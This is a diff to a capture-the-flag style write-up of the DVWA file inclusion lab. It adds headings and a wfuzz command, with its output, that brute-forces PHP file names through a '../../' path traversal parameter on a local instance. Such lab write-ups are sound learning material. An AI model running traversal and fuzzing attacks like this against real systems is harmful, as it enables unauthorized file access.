@@ -70,6 +70,8 @@ To make the "The PHP function allow_url_include is not enabled." message to disa
 
 > _This allows for direct input into one of many PHP functions that will include the content when executing. Depending on the web service configuration will depend if RFI is a possibility._
 
+### Local File Inclusion
+
 When we click any of the 3 files on the FI homepage, the address bar changes like this:
 
 ![](file2.png)
@@ -123,7 +125,31 @@ We are missing one quote, so we can try searching for `.php` file via dir-bustin
 ```shell
 # searching for '.php' file in the '/hackable/flags' directory
 wfuzz -c --hh 3152 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -b "PHPSESSID=m4ac6f2g7uig8aec7hgc8787kc; security=low" -u "http://127.0.0.1:42001/vulnerabilities/fi/?page=../../hackable/flags/FUZZ.php"
+ /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://127.0.0.1:42001/vulnerabilities/fi/?page=../../hackable/flags/FUZZ.php
+Total requests: 220560
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload
+=====================================================================
+
+000001557:   200        93 L     266 W      3509 Ch     "fi"
+
+Total time: 166.8337
+Processed Requests: 220560
+Filtered Requests: 220559
+Requests/sec.: 1322.034
 ```
+
+Nothing but the `fi` file found that we already know!
+
+### Remote File Inclusion
+
+
 
 ## Security: Medium
 
